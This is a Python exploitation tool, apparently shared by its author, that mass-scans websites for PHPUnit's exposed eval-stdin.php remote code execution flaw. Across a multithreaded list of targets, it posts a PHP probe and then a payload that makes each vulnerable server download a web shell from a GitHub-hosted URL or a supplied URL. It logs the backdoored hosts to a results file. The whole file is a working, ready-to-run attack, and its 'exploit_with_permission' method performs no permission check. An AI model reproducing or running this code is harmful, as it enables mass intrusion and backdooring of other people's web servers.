import requests
import argparse
import concurrent.futures
import os
import sys
from urllib.parse import urlparse

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    END = '\033[0m'

green = Colors.GREEN
red = Colors.RED
yellow = Colors.YELLOW
cyan = Colors.CYAN
end = Colors.END

banner = '''
╔═══════════════════════════════════════════════════════════╗
║  PHPUnit RCE Auto Exploiter                		            ║
║  Author: Maw3six | t.me/maw3six                      	    ║
╚═══════════════════════════════════════════════════════════╝
'''

class PHPUnitExploit:
    def __init__(self, shell_url=None):
        self.paths = [
            '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php',
            '/vendor/phpunit/src/Util/PHP/eval-stdin.php',
            '/vendor/phpunit/Util/PHP/eval-stdin.php',
            '/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/phpunit/phpunit/Util/PHP/eval-stdin.php',
            '/phpunit/src/Util/PHP/eval-stdin.php',
            '/phpunit/Util/PHP/eval-stdin.php',
            '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/tmp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/api/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php',
            '/v1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/v2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/v3/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        ]
        
        self.data1 = '<?php echo "PHPUnit_Vuln_Check"; ?>'
        
        if shell_url:
            self.data2 = f"<?php copy('{shell_url}','shell.php');echo file_exists('shell.php')?'#shell_uploaded#':'#shell_failed#'; ?>"
        else:
            self.data2 = "<?php copy('https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/hidden.php','ip.php');echo file_exists('ip.php')?'#shell_uploaded#':'#shell_failed#'; ?>"
        
        self.timeout = 10
        self.results_dir = 'results'
        self.filename = f'{self.results_dir}/shell.txt'
        self.filemanual = f'{self.results_dir}/manual.txt'
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        }
        
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
    
    def fix_url(self, url):
        """Memperbaiki format URL"""
        if not url.startswith('http'):
            url = 'http://' + url
        
        if url.endswith('/'):
            url = url[:-1]
            
        return url
    
    def exploit_with_permission(self, url):
        url = self.fix_url(url)
        domain = urlparse(url).netloc
        
        for path in self.paths:
            try:
                target_url = url + path
                req = requests.post(target_url, data=self.data1, headers=self.headers, timeout=self.timeout)
                
                if req.status_code == 200 and 'PHPUnit_Vuln_Check' in req.text:
                    print(f"{green}[+] {domain} : VULNERABLE at {path}{end}")
                    
                    req = requests.post(target_url, data=self.data2, headers=self.headers, timeout=self.timeout)
                    
                    if '#shell_uploaded#' in req.text:
                        shell_path = target_url.replace('eval-stdin.php', 'shell.php')
                        print(f"{green}[+] Shell uploaded successfully: {shell_path}{end}")
                        
                        with open(self.filename, 'a') as sv:
                            sv.write(f"{domain}|{shell_path}\n")
                        
                        try:
                            shell_check = requests.get(shell_path, timeout=self.timeout)
                            if shell_check.status_code == 200:
                                print(f"{green}[+] Shell is accessible!{end}")
                            else:
                                print(f"{yellow}[!] Shell uploaded but might not be accessible.{end}")
                        except:
                            print(f"{yellow}[!] Could not verify shell accessibility.{end}")
                        
                        return True
                    else:
                        print(f"{yellow}[!] Target vulnerable but shell upload failed. Adding to manual list.{end}")
                        with open(self.filemanual, 'a') as sv:
                            sv.write(f"{domain}|{target_url}\n")
                        return True
            
            except requests.exceptions.ConnectionError:
                continue
            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                # print(f"Error: {e}")
                continue
        
        print(f"{red}[-] {domain} : NOT VULNERABLE{end}")
        return False

def process_url(url, exploiter):
    """Process a single URL"""
    try:
        exploiter.exploit_with_permission(url)
    except Exception as e:
        print(f"{red}Error processing {url}: {str(e)}{end}")

def main():
    print(banner)
    
    parser = argparse.ArgumentParser(description='PHPUnit eval-stdin.php RCE Auto Exploiter')
    parser.add_argument('-l', '--list', help='File containing list of URLs to check', required=False)
    parser.add_argument('-u', '--url', help='Single URL to check', required=False)
    parser.add_argument('-s', '--shell', help='URL to your custom shell for upload', required=False)
    parser.add_argument('-t', '--threads', help='Number of threads (default: 10)', type=int, default=10)
    
    args = parser.parse_args()
    
    if not args.list and not args.url:
        parser.print_help()
        print(f"\n{red}Error: You must provide either a URL or a list of URLs{end}")
        sys.exit(1)
    
    exploiter = PHPUnitExploit(args.shell)
    
    if args.url:
        # Mode URL tunggal
        print(f"{yellow}[*] Checking single URL: {args.url}{end}")
        exploiter.exploit_with_permission(args.url)

    elif args.list:
        # Mode daftar URL
        try:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"{yellow}[*] Loaded {len(urls)} URLs from {args.list}{end}")
            print(f"{yellow}[*] Starting exploitation with {args.threads} threads{end}")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = [executor.submit(process_url, url, exploiter) for url in urls]
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{red}Error in thread: {str(e)}{end}")
            
            print(f"\n{green}[*] Exploitation completed!{end}")
            print(f"{green}[*] Results saved to:{end}")
            print(f"{green}    - Shells: {exploiter.filename}{end}")
            print(f"{green}    - Manual targets: {exploiter.filemanual}{end}")
            
        except FileNotFoundError:
            print(f"{red}Error: File {args.list} not found{end}")
            sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{yellow}[!] Process interrupted by user{end}")
        sys.exit(0)
    except Exception as e:
        print(f"{red}[!] An error occurred: {str(e)}{end}")
        sys.exit(1)
